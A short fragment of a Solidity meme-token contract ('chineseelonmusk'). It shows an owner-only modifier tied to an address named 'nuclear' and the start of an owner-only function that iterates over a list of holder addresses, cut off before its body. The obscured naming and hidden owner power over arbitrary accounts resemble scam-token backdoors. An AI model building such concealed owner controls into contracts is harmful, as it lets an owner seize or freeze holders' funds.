...
contract chineseelonmusk is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == nuclear, "Not allowed");
        _;
    }

    function huge(address[] memory culture) public onlyOwner() {
        for (uint256 i = 0; i < culture.length; i++) {
            address account = culture[i];
